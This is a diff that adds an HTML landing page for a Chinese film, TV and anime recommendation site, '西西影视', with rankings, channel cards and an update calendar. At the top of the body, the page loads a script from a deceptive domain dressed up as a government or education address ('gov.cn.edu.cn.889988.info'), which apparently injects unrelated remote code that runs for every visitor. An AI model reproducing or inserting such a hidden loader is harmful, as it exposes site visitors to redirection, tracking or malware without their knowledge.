@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="西西影视 - 温暖精选电影、电视剧、综艺、动漫高分好内容，陪你度过每一个温馨观影时光。">
+<meta name="keywords" content="西西影视,影视推荐,电影推荐,电视剧推荐,综艺,动漫,温暖好剧,xixiyingshi">
+<meta name="author" content="西西影视">
+<meta property="og:title" content="西西影视 - 温暖精选影视推荐">
+<meta property="og:description" content="西西影视陪你度过每一个温馨观影时光，精选电影、电视剧、综艺、动漫高分内容。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://xixiyingshi-cn.github.io/">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#fff8e6">
+<title>西西影视 - 温暖精选影视推荐 | 电影电视剧综艺动漫</title>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+:root{
+  --bg:#fffdf6;--paper:#ffffff;--cream:#fff8e6;--line:#f0e0c0;
+  --honey:#f59e0b;--amber:#d97706;--sun:#fbbf24;--brown:#78350f;--cocoa:#92400e;
+  --ink:#3a2a14;--muted:#8a7148;--mint:#84cc16;--rose:#f43f5e;--sky:#0ea5e9;--radius:24px;
+}
+html{scroll-behavior:smooth;}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','PingFang SC','Microsoft YaHei',sans-serif;background:var(--bg);color:var(--ink);line-height:1.8;overflow-x:hidden;-webkit-font-smoothing:antialiased;}
+a{text-decoration:none;color:inherit;}ul{list-style:none;}button{font-family:inherit;cursor:pointer;border:none;}
+
+/* ===== WAVES BG ===== */
+.waves{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden;background:linear-gradient(180deg,#fffdf6,#fff8e6);}
+.wave{position:absolute;left:-10%;width:120%;height:120px;border-radius:50%;background:linear-gradient(180deg,rgba(251,191,36,.10),transparent);}
+.w1{top:14%;animation:drift 18s ease-in-out infinite alternate;}
+.w2{top:46%;height:160px;opacity:.7;animation:drift 24s ease-in-out infinite alternate-reverse;}
+.w3{top:76%;height:200px;opacity:.5;animation:drift 30s ease-in-out infinite alternate;}
+@keyframes drift{from{transform:translateX(-3%) rotate(-1deg);}to{transform:translateX(3%) rotate(1deg);}}
+
+/* ===== NAV ===== */
+.nw{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(255,253,246,.94);backdrop-filter:blur(18px);border-bottom:1px solid var(--line);}
+.ni{max-width:1400px;margin:0 auto;padding:0 28px;display:flex;align-items:center;justify-content:space-between;height:68px;}
+.logo{display:flex;align-items:center;gap:11px;font-size:19px;font-weight:900;letter-spacing:-.3px;color:var(--cocoa);}
+.lm{width:36px;height:36px;border-radius:12px;background:linear-gradient(140deg,#fbbf24,#f59e0b);display:flex;align-items:center;justify-content:center;font-size:16px;box-shadow:0 4px 16px rgba(245,158,11,.35);}
+.nl{display:flex;gap:4px;}
+.nl a{padding:9px 17px;border-radius:11px;font-size:13.5px;color:var(--muted);transition:.3s;font-weight:700;}
+.nl a:hover{color:var(--amber);background:var(--cream);}
+.nl a.on{color:#fff;background:linear-gradient(135deg,#f59e0b,#d97706);}
+.mb{display:none;flex-direction:column;gap:5px;padding:6px;}
+.mb i{width:22px;height:2px;background:var(--amber);border-radius:2px;}
+
+/* ===== HERO ===== */
+.hero{min-height:100vh;display:flex;align-items:center;position:relative;z-index:2;padding-top:68px;}
+.hero-in{max-width:1400px;margin:0 auto;padding:0 28px;width:100%;}
+.hbadge{display:inline-flex;align-items:center;gap:7px;padding:7px 16px;border-radius:20px;background:var(--cream);border:1px solid var(--line);font-size:12px;color:var(--cocoa);font-weight:700;margin-bottom:20px;}
+.hero h1{font-size:clamp(2rem,5.2vw,4.2rem);font-weight:900;line-height:1.08;margin-bottom:14px;letter-spacing:-1.3px;color:var(--cocoa);}
+.hero h1 .grad{background:linear-gradient(100deg,#f59e0b,#f43f5e);-webkit-background-clip:text;background-clip:text;color:transparent;}
+.hero-sub{font-size:clamp(.9rem,1.3vw,1rem);color:var(--muted);max-width:540px;margin-bottom:30px;}
+.hb{display:flex;gap:12px;flex-wrap:wrap;}
+.btn{padding:13px 30px;border-radius:14px;font-size:14.5px;font-weight:700;transition:.3s;display:inline-flex;align-items:center;gap:7px;}
+.b1{background:linear-gradient(135deg,#fbbf24,#f59e0b);color:#4a2508;box-shadow:0 6px 20px rgba(245,158,11,.35);}
+.b1:hover{transform:translateY(-2px);box-shadow:0 12px 30px rgba(245,158,11,.45);}
+.b2{border:1.5px solid var(--line);color:var(--cocoa);background:var(--paper);}
+.b2:hover{border-color:var(--amber);color:var(--amber);}
+.stats{display:flex;gap:48px;margin-top:42px;flex-wrap:wrap;}
+.stat b{display:block;font-size:1.9rem;font-weight:800;color:var(--amber);}
+.stat span{font-size:.76rem;color:var(--muted);}
+
+/* ===== SECTION ===== */
+.sec{padding:96px 28px;position:relative;z-index:2;}
+.si{max-width:1400px;margin:0 auto;}
+.sc{margin-bottom:50px;display:flex;justify-content:space-between;align-items:flex-end;gap:20px;flex-wrap:wrap;}
+.sc-l .eyebrow{font-size:11px;color:var(--amber);letter-spacing:3px;text-transform:uppercase;font-weight:700;display:block;margin-bottom:5px;}
+.sc-l h2{font-size:clamp(1.45rem,3vw,2.1rem);font-weight:900;letter-spacing:-.6px;color:var(--cocoa);}
+.sc-l p{font-size:.93rem;color:var(--muted);max-width:560px;margin-top:7px;}
+.chips{display:flex;gap:8px;flex-wrap:wrap;}
+.chip{padding:8px 16px;border-radius:20px;border:1px solid var(--line);background:var(--paper);color:var(--muted);font-size:13px;font-weight:600;transition:.3s;}
+.chip:hover,.chip.on{background:var(--amber);color:#fff;border-color:var(--amber);}
+
+/* ===== SPIRAL ZEBRA ===== */
+.zebra{background:var(--cream);}
+.zlist{display:flex;flex-direction:column;gap:0;border-radius:22px;overflow:hidden;border:1px solid var(--line);}
+.zrow{display:grid;grid-template-columns:64px 1.4fr 1fr 100px;gap:18px;align-items:center;padding:20px 26px;transition:.35s;position:relative;}
+.zrow:nth-child(odd){background:var(--paper);}
+.zrow:nth-child(even){background:rgba(255,248,230,.7);}
+.zrow:hover{background:rgba(251,191,36,.12);transform:translateX(6px);}
+.znum{width:44px;height:44px;border-radius:12px;background:linear-gradient(135deg,#fbbf24,#f59e0b);color:#4a2508;display:flex;align-items:center;justify-content:center;font-size:1.15rem;font-weight:900;}
+.zrow h4{font-size:1rem;font-weight:800;color:var(--cocoa);}
+.zrow .zmeta{font-size:.78rem;color:var(--muted);}
+.zrow .zdesc{font-size:.8rem;color:var(--muted);}
+.zrow .zrate{text-align:right;font-size:1.05rem;font-weight:900;color:var(--amber);}
+
+/* ===== SNACK GRID ===== */
+.snack{background:var(--bg);}
+.sgrid{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;}
+.scard{border-radius:18px;padding:22px;border:1px solid var(--line);background:var(--paper);transition:.4s;position:relative;overflow:hidden;}
+.scard::before{content:'';position:absolute;top:-40px;right:-40px;width:100px;height:100px;border-radius:50%;background:var(--hue);opacity:.14;transition:.4s;}
+.scard:hover{transform:translateY(-8px) rotate(-1deg);border-color:var(--hue);}
+.scard:hover::before{transform:scale(1.6);}
+.scard .sico{font-size:2.1rem;margin-bottom:12px;display:block;}
+.scard h4{font-size:1rem;font-weight:800;margin-bottom:6px;color:var(--cocoa);}
+.scard p{font-size:.79rem;color:var(--muted);line-height:1.65;}
+
+/* ===== SWIRL TIMELINE ===== */
+.swirl{background:var(--cream);}
+.swtrack{position:relative;padding:20px 0;}
+.swtrack::before{content:'';position:absolute;left:50%;top:0;bottom:0;width:3px;background:linear-gradient(180deg,#fbbf24,#f59e0b,#f43f5e,#84cc16);transform:translateX(-50%);border-radius:3px;}
+.swnode{display:grid;grid-template-columns:1fr 60px 1fr;align-items:center;gap:0;margin-bottom:26px;}
+.swdot{width:52px;height:52px;border-radius:50%;background:linear-gradient(140deg,#fbbf24,#f59e0b);display:flex;align-items:center;justify-content:center;font-size:1.3rem;box-shadow:0 0 0 6px var(--cream),0 0 0 7px rgba(245,158,11,.3);z-index:2;justify-self:center;}
+.swcard{border-radius:16px;padding:20px 22px;border:1px solid var(--line);background:var(--paper);transition:.4s;}
+.swcard:hover{transform:translateY(-5px);box-shadow:0 12px 28px rgba(245,158,11,.15);}
+.swcard h4{font-size:1rem;font-weight:800;color:var(--cocoa);margin-bottom:4px;}
+.swcard p{font-size:.8rem;color:var(--muted);}
+.swcard .day{font-size:.72rem;font-weight:700;color:var(--amber);letter-spacing:1px;}
+.swleft{text-align:right;}
+.swright{text-align:left;}
+.swempty{visibility:hidden;}
+
+/* ===== FOOTER ===== */
+footer{background:#fdf6e3;padding:54px 28px 22px;border-top:1px solid var(--line);position:relative;z-index:2;}
+.fi{max-width:1400px;margin:0 auto;}
+.ft{display:grid;grid-template-columns:2.2fr 1fr 1fr 1fr;gap:38px;margin-bottom:30px;}
+.brand .logo{margin-bottom:12px;}
+.brand p{color:var(--muted);font-size:.83rem;line-height:1.9;max-width:330px;}
+.fc h4{font-size:12px;font-weight:700;margin-bottom:13px;letter-spacing:1px;color:var(--amber);}
+.fc li{margin-bottom:8px;}
+.fc a{color:var(--muted);font-size:.82rem;transition:.25s;}
+.fc a:hover{color:var(--cocoa);}
+.fb{padding-top:18px;border-top:1px solid var(--line);display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;}
+.fb p{font-size:.76rem;color:var(--muted);}
+.fl a{color:var(--muted);font-size:.76rem;margin-left:18px;transition:.25s;}
+.fl a:hover{color:var(--cocoa);}
+#top{position:fixed;bottom:26px;right:26px;width:46px;height:46px;border-radius:50%;background:linear-gradient(135deg,#fbbf24,#f59e0b);color:#4a2508;font-size:17px;z-index:999;opacity:0;visibility:hidden;transition:.3s;display:flex;align-items:center;justify-content:center;font-weight:900;box-shadow:0 6px 22px rgba(245,158,11,.35);}
+#top.show{opacity:1;visibility:visible;}
+#top:hover{transform:translateY(-3px);}
+
+@media(max-width:1060px){
+  .sgrid{grid-template-columns:repeat(2,1fr);}
+  .zrow{grid-template-columns:52px 1fr;gap:14px;}
+  .zrow .zdesc,.zrow .zrate{display:none;}
+}
+@media(max-width:860px){
+  .swtrack::before{left:26px;}
+  .swnode{grid-template-columns:52px 1fr;gap:14px;}
+  .swdot{justify-self:start;}
+  .swright,.swleft{text-align:left;}
+  .swempty{display:none;}
+}
+@media(max-width:768px){
+  .nl{position:fixed;top:68px;left:0;right:0;flex-direction:column;padding:14px 28px;background:rgba(255,253,246,.98);transform:translateY(-150%);opacity:0;transition:.35s;gap:4px;}
+  .nl.open{transform:translateY(0);opacity:1;}
+  .nl a{width:100%;text-align:center;padding:12px;}
+  .mb{display:flex;}
+  .stats{gap:22px;} .stats .stat b{font-size:1.45rem;}
+  .sec{padding:64px 16px;}
+  .ft{grid-template-columns:1fr 1fr;}
+}
+@media(max-width:520px){
+  .ft{grid-template-columns:1fr;}
+  .sgrid{grid-template-columns:1fr;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<div class="waves"><div class="wave w1"></div><div class="wave w2"></div><div class="wave w3"></div></div>
+
+<nav class="nw"><div class="ni">
+  <a href="#" class="logo"><span class="lm">🍯</span>西西影视</a>
+  <div class="nl" id="nl"><a href="#home" class="on">首页</a><a href="#zebra">热播排行</a><a href="#snack">内容频道</a><a href="#swirl">更新日历</a></div>
+  <div class="mb" id="mb"><i></i><i></i><i></i></div>
+</div></nav>
+
+<section class="hero" id="home">
+  <div class="hero-in">
+    <div class="hbadge">🍯 温暖相伴 · 精选好内容</div>
+    <h1>西西影视 <span class="grad">✨</span><br>温暖你的每一刻</h1>
+    <p class="hero-sub">西西影视陪你度过每一个温馨观影时光，精选高分电影、热门剧集、综艺动漫，每一部都值得被珍藏。</p>
+    <div class="hb"><a href="#zebra" class="btn b1">🍿 发现好片</a><a href="#snack" class="btn b2">🎬 内容频道</a></div>
+    <div class="stats">
+      <div class="stat"><b>8,888+</b><span>精选内容</span></div>
+      <div class="stat"><b>4大</b><span>内容频道</span></div>
+      <div class="stat"><b>98%</b><span>好评推荐</span></div>
+      <div class="stat"><b>365天</b><span>持续更新</span></div>
+    </div>
+  </div>
+</section>
+
+<section class="sec zebra" id="zebra">
+  <div class="si">
+    <div class="sc"><div class="sc-l"><span class="eyebrow">Hot Ranking</span><h2>🍿 热播排行 · 大家都在看</h2><p>西西影视实时热度榜单，斑马纹信息卡片一目了然</p></div>
+      <div class="chips"><span class="chip on">综合</span><span class="chip">电影</span><span class="chip">剧集</span><span class="chip">综艺</span></div>
+    </div>
+    <div class="zlist">
+      <div class="zrow"><div class="znum">1</div><div><h4>奥本海默</h4><div class="zmeta">传记 · 历史 · 诺兰</div></div><div class="zdesc">原子弹之父的传奇人生，横扫奥斯卡的传记巨制。</div><div class="zrate">8.8 ❤️</div></div>
+      <div class="zrow"><div class="znum">2</div><div><h4>漫长的季节</h4><div class="zmeta">悬疑 · 剧情 · 国产剧</div></div><div class="zdesc">一桩碎尸案牵扯出三代人的命运，年度最佳剧集。</div><div class="zrate">9.4 💛</div></div>
+      <div class="zrow"><div class="znum">3</div><div><h4>周处除三害</h4><div class="zmeta">动作 · 犯罪 · 港台</div></div><div class="zdesc">通缉犯的自我救赎之路，暴力美学的极致表达。</div><div class="zrate">8.2 🧡</div></div>
+      <div class="zrow"><div class="znum">4</div><div><h4>繁花</h4><div class="zmeta">年代 · 商战 · 王家卫</div></div><div class="zdesc">沪上风云九十年代，光影交织的上海传奇。</div><div class="zrate">8.7 💛</div></div>
+      <div class="zrow"><div class="znum">5</div><div><h4>年会不能停！</h4><div class="zmeta">喜剧 · 职场 · 国产</div></div><div class="zdesc">打工人嘴替神作，笑中带泪的职场荒诞寓言。</div><div class="zrate">8.1 🧡</div></div>
+      <div class="zrow"><div class="znum">6</div><div><h4>种地吧</h4><div class="zmeta">纪实 · 劳作 · 综艺</div></div><div class="zdesc">十个少年耕耘一百天，治愈系劳作真人秀。</div><div class="zrate">8.9 💚</div></div>
+    </div>
+  </div>
+</section>
+
+<section class="sec snack" id="snack">
+  <div class="si">
+    <div class="sc"><div class="sc-l"><span class="eyebrow">Channels</span><h2>🎬 内容频道 · 随心选择</h2><p>西西影视四大频道，每一块都是一份精心准备的小食</p></div>
+      <div class="chips"><span class="chip on">全部</span><span class="chip">电影</span><span class="chip">剧集</span><span class="chip">综艺</span></div>
+    </div>
+    <div class="sgrid">
+      <div class="scard" style="--hue:#f59e0b;"><span class="sico">🎞️</span><h4>电影频道</h4><p>院线热映、经典回顾、独立佳作，从文艺到商业一应俱全。</p></div>
+      <div class="scard" style="--hue:#f43f5e;"><span class="sico">📺</span><h4>剧集频道</h4><p>国产剧、美剧、韩剧、日剧，追剧不迷路，更新及时看。</p></div>
+      <div class="scard" style="--hue:#0ea5e9;"><span class="sico">🎤</span><h4>综艺频道</h4><p>真人秀、脱口秀、音乐竞演，轻松解压的快乐源泉。</p></div>
+      <div class="scard" style="--hue:#84cc16;"><span class="sico">🌸</span><h4>动漫频道</h4><p>国漫日漫新番老番，治愈热血治愈系，二次元的精神食粮。</p></div>
+      <div class="scard" style="--hue:#a855f7;"><span class="sico">📽️</span><h4>纪录片</h4><p>自然人文历史科技，用影像记录真实世界的每一面。</p></div>
+      <div class="scard" style="--hue:#ec4899;"><span class="sico">🎭</span><h4>短剧专区</h4><p>竖屏短剧、微短剧，碎片时间也能追完整故事。</p></div>
+      <div class="scard" style="--hue:#14b8a6;"><span class="sico">🌙</span><h4>深夜档</h4><p>深夜专属治愈内容，助眠放松的安静好片精选。</p></div>
+      <div class="scard" style="--hue:#f97316;"><span class="sico">⭐</span><h4>高分榜</h4><p>豆瓣高分必看清单，每一部都经得起反复回味。</p></div>
+    </div>
+  </div>
+</section>
+
+<section class="sec swirl" id="swirl">
+  <div class="si">
+    <div class="sc"><div class="sc-l"><span class="eyebrow">Update Calendar</span><h2>🗓️ 更新日历 · 精彩不断</h2><p>西西影视为你标记每周更新节奏，螺旋时间轴一目了然</p></div>
+      <div class="chips"><span class="chip on">本周</span><span class="chip">下周</span><span class="chip">连载</span><span class="chip">完结</span></div>
+    </div>
+    <div class="swtrack">
+      <div class="swnode"><div class="swcard swleft"><div class="day">MON · 周一</div><h4>《种地吧》第三季开播</h4><p>少年们再次回归田野，开启新一季的耕耘旅程。</p></div><div class="swdot">🌾</div><div class="swempty"></div></div>
+      <div class="swnode"><div class="swempty"></div><div class="swdot">🎬</div><div class="swcard swright"><div class="day">WED · 周三</div><h4>《封神第二部》独家幕后</h4><p>殷商大战背后的视效揭秘与主演访谈特辑上线。</p></div></div>
+      <div class="swnode"><div class="swcard swleft"><div class="day">FRI · 周五</div><h4>《歌手2024》总决赛</h4><p>年度音综巅峰对决，谁将问鼎歌王宝座？</p></div><div class="swdot">🎤</div><div class="swempty"></div></div>
+      <div class="swnode"><div class="swempty"></div><div class="swdot">📺</div><div class="swcard swright"><div class="day">SAT · 周六</div><h4>《墨雨云间》全集解锁</h4><p>复仇爽剧高能收官，大女主逆袭的最终章。</p></div></div>
+      <div class="swnode"><div class="swcard swleft"><div class="day">SUN · 周日</div><h4>《庆余年》特别篇预告</h4><p>范闲回归，新一季权谋大戏即将拉开序幕。</p></div><div class="swdot">👑</div><div class="swempty"></div></div>
+      <div class="swnode"><div class="swempty"></div><div class="swdot">🌸</div><div class="swcard swright"><div class="day">NEXT · 下周一</div><h4>《蓦然回首》剧场版上映</h4><p>藤本タツキ新作动画，一场关于创作与相遇的故事。</p></div></div>
+    </div>
+  </div>
+</section>
+
+<footer><div class="fi">
+  <div class="ft">
+    <div class="brand"><div class="logo"><span class="lm">🍯</span>西西影视</div>
+      <p>西西影视，温暖相伴，为你精选高分电影、热门剧集、综艺动漫，陪你度过每一个温馨观影时光。</p></div>
+    <div class="fc"><h4>内容频道</h4><ul><li><a href="#home">首页</a></li><li><a href="#zebra">热播排行</a></li><li><a href="#snack">内容频道</a></li><li><a href="#swirl">更新日历</a></li></ul></div>
+    <div class="fc"><h4>热门标签</h4><ul><li><a href="#">高分电影</a></li><li><a href="#">热门剧集</a></li><li><a href="#">综艺动漫</a></li><li><a href="#">纪录片</a></li></ul></div>
+    <div class="fc"><h4>关于我们</h4><ul><li><a href="#">关于平台</a></li><li><a href="#">商务合作</a></li><li><a href="#">用户协议</a></li><li><a href="#">隐私政策</a></li></ul></div>
+  </div>
+  <div class="fb"><p>&copy; 2024 西西影视 XiXiYingShi. All Rights Reserved. | 网址：https://xixiyingshi-cn.github.io/</p><div class="fl"><a href="#">网站地图</a><a href="#">友情链接</a><a href="#">意见反馈</a></div></div>
+</div></footer>
+
+<button id="top">↑</button>
+
+<script>
+const mb=document.getElementById('mb'),nl=document.getElementById('nl');
+mb.addEventListener('click',()=>nl.classList.toggle('open'));
+document.querySelectorAll('.nl a').forEach(a=>a.addEventListener('click',()=>nl.classList.remove('open')));
+
+const secs=document.querySelectorAll('section[id]'),as=document.querySelectorAll('.nl a');
+window.addEventListener('scroll',()=>{let cur='';secs.forEach(s=>{if(window.scrollY>=s.offsetTop-130)cur=s.id;});as.forEach(a=>a.classList.toggle('on',a.getAttribute('href')==='#'+cur));});
+
+document.querySelectorAll('.chip').forEach(c=>c.addEventListener('click',function(){this.parentElement.querySelectorAll('.chip').forEach(x=>x.classList.remove('on'));this.classList.add('on');}));
+
+const topBtn=document.getElementById('top');
+window.addEventListener('scroll',()=>topBtn.classList.toggle('show',window.scrollY>400));
+topBtn.addEventListener('click',()=>window.scrollTo({top:0,behavior:'smooth'}));
+
+const io=new IntersectionObserver(es=>{es.forEach(e=>{if(e.isIntersecting){e.target.style.opacity='1';e.target.style.transform='translateY(0)';}});},{threshold:.08});
+document.querySelectorAll('.zrow,.scard,.swcard').forEach((el,i)=>{el.style.opacity='0';el.style.transform='translateY(26px)';el.style.transition='all .5s ease '+(i%4)*.07+'s';io.observe(el);});
+</script>
+</body>
+</html>
